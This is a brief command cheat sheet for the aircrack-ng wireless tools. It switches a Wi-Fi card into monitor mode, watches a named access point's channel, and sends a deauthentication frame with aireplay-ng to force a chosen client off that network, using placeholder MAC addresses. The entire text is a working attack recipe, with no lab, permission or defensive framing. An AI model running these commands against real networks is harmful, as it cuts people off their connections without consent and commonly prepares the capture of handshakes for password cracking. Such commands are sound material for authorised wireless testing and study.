
#Start Monitor
airmon-ng start wlan0
airodump-ng -c 1 –essid name-of-AP wlan0mon

#To disconnect the particular client –
aireplay-ng -0 1 -a mac-address-of-access-point -c mac-address-of-client wlan0mon

#To restart
airmon-ng check kill
airmon-ng stop wlan0mon
airmon-ng start wlan0mon